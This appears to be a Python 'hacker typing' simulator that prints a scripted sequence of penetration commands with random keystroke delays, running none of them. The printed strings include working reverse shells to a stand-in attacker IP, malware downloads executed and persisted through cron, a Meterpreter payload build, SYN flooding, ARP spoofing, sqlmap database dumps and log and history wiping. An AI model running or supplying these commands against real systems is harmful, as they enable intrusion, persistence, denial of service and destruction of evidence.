import hashlib
import uuid
import random
import time
import subprocess

# Function to generate a random MD5 hash
def generate_random_md5():
    # Generate a random UUID
    random_uuid = str(uuid.uuid4())
    # Hash the UUID using MD5
    md5_hash = hashlib.md5(random_uuid.encode()).hexdigest()
    return md5_hash

# Function to simulate typing with random delays
def type_with_random_delay(text, min_char_delay=20, max_char_delay=60, min_message_delay=500, max_message_delay=2000):
    for char in text:
        delay = random.randint(min_char_delay, max_char_delay) / 1000  # Convert milliseconds to seconds
        print(char, end='', flush=True)
        time.sleep(delay)
    print()  # Print newline after typing completes
    time.sleep(random.randint(min_message_delay, max_message_delay) / 1000)  # Delay between messages

# Function to simulate executing commands slowly
def simulate_commands():
    type_with_random_delay("sudo nmap -O <target IP>")
    type_with_random_delay("sudo nmap -sV -p 1-65535 <target IP>")
    type_with_random_delay("sudo nmap -Pn --script vuln <target IP>")
    type_with_random_delay("sudo nmap --script=http-enum <target IP>")
    type_with_random_delay("sudo nmap -sC -sV -p22 <target IP>")
    type_with_random_delay("sudo nmap --script dns-brute <target domain>")
    type_with_random_delay("sudo nmap -sU -p 123,161,162 <target IP>")
    type_with_random_delay("sudo nmap --script ssl-enum-ciphers -p 443 <target IP>")
    type_with_random_delay("nmap --script smb-os-discovery.nse <target IP>")
    type_with_random_delay("ssh -L 5901:127.0.0.1:5901 pi@<target IP>")
    type_with_random_delay("ssh-keygen")
    type_with_random_delay("ssh-copy-id pi@<target IP>")
    type_with_random_delay("ssh -o ProxyCommand=“ssh -W %h:%p pi@<proxy IP>” pi@<target IP>")
    type_with_random_delay("ssh -D 8080 pi@<target IP>")
    type_with_random_delay("ssh -t pi@<target IP> ‘sudo tcpdump -i eth0’")
    type_with_random_delay("ssh-add <private key file>")
    type_with_random_delay("ssh -A pi@<target IP>")
    type_with_random_delay("python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<target IP>”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’")
    type_with_random_delay("sudo python -m SimpleHTTPServer 8080")
    type_with_random_delay("python sqlmap.py -u “<URL with parameter>” --dbs")
    type_with_random_delay("python dirb.py <URL>")
    type_with_random_delay("python sqlmap.py --batch -u “<URL>” --forms --dbs --crawl=3")
    type_with_random_delay("python3 -m http.server 8080")
    type_with_random_delay("python buffer_overflow_exploit.py <target IP>")
    type_with_random_delay("python3 -c ‘import pty; pty.spawn(“/bin/bash”)’")
    type_with_random_delay("python sqlmap.py -u “<URL>” --risk=3 --level=5 --dbms=mysql --dump")
    type_with_random_delay("curl -X POST -F “payload=@fsociety.dat” http://<target IP>/upload")
    type_with_random_delay("wget http://<malicious URL>/malware -O /tmp/update; sudo chmod +x /tmp/update; /tmp/update")
    type_with_random_delay("crontab -e")
    type_with_random_delay("echo “* * * * * /usr/bin/python /tmp/update” | crontab -")
    type_with_random_delay("echo “bash -i >& /dev/tcp/<attacker IP>/8080 0>&1” > /tmp/backdoor.sh")
    type_with_random_delay("chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh")
    type_with_random_delay("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=4444 -f elf > shell.elf")
    type_with_random_delay("echo ‘0 /3 * * * /usr/bin/wget http://<malicious URL>/script -O - | /bin/sh’ >> /var/spool/cron/crontabs/root")
    type_with_random_delay("hping3 -S --flood -V <target IP> -p 80")
    type_with_random_delay("ettercap -T -M arp:remote /<target IP>// /<gateway IP>//")
    type_with_random_delay("arpspoof -i eth0 -t <target IP> <gateway IP>")
    type_with_random_delay("nmap --script=snmp-sysdescr <target IP>")
    type_with_random_delay("nmap --script=firewall-bypass <target IP>")
    type_with_random_delay("iptables -A INPUT -p tcp --dport 80 -j DROP")
    type_with_random_delay("mitmproxy -p 8080")
    type_with_random_delay("nmap --script broadcast-dhcp-discover")
    type_with_random_delay("steghide embed -cf picture.jpg -ef secret.txt")
    type_with_random_delay("openssl enc -aes-256-cbc -in plain.txt -out encrypted.dat")
    type_with_random_delay("shred -u -n 10 sensitivefile.txt")
    type_with_random_delay("find / -name “*.log” -type f -delete")
    type_with_random_delay("history -c && history -w")
    type_with_random_delay("tmpwatch --mtime --all 12 /tmp")
    type_with_random_delay("echo ‘export HISTFILESIZE=0’ >> ~/.bashrc")
    type_with_random_delay("find / -type f -name '.log’ -exec truncate -s 0 {} ;")

# Run the simulation
simulate_commands()
